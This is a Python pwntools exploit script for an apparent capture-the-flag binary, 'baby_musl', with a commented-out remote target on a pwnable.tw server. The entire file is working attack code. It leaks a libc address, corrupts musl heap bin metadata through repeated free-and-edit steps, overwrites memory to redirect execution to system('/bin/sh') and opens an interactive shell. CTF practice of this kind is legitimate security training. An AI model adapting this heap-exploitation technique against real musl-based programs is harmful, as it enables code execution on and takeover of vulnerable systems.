from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('baby_musl')
# io = remote('chall.pwnable.tw', 10202)
libc = ELF('/usr/lib/x86_64-linux-musl/libc.so')
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/musl/musl-1.1.24/build/lib/libc.so')
elf = ELF('baby_musl')


def add(index, size):
    io.sendlineafter('[4] Show\n', '1')
    io.sendlineafter('Enter index\n', str(index))
    io.sendlineafter('Enter size\n', str(size))


def delete(index):
    io.sendlineafter('[4] Show\n', '2')
    io.sendlineafter('Enter index\n', str(index))


def edit(index, data):
    io.sendlineafter('[4] Show\n', '3')
    io.sendlineafter('Enter index\n', str(index))
    io.sendafter('Enter data\n', data)


def show(index):
    io.sendlineafter('[4] Show\n', '4')
    io.sendlineafter('Enter index\n', str(index))
    return io.recvline()[:-1]


def pwn():
    io.sendafter('Enter your name\n', 'a' * 0x20)
    add(0, 0x10)
    # libc_base = u64(show(0).ljust(8, b'\x00')) - 0x96e50
    libc_base = u64(show(0).ljust(8, b'\x00')) - 0xb0dd0
    log.success('libc_base: ' + hex(libc_base))
    # binmap = libc_base + libc.sym['mal']
    binmap = libc_base + 0xb0a40
    bins_16 = binmap + 8 + 0x18 * 16
    head = libc_base + libc.sym['environ'] + 0x20
    system = libc_base + libc.sym['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
    add(1, 0x10)
    add(1, 0x210)
    add(2, 0x10)
    delete(0)
    # gdb.attach(io)
    delete(1)
    edit(0, p64(binmap - 0x20) * 2)
    add(0, 0x10)
    delete(0)
    edit(0, p64(bins_16 - 0x10) + p64(binmap - 0x20))
    add(0, 0x10)
    add(1, 0x210)
    edit(0, p64(head - 0x18) + p64(binmap - 0x10))
    add(0, 0x10)
    payload = p64(binmap - 0x10)
    payload += b'A' * 0xf8
    payload += p64(system)
    payload += b'A' * 0xf8
    payload += p64(bin_sh)
    edit(1, payload)

    # gdb.attach(io)
    io.sendlineafter('[4] Show\n', '0')
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()
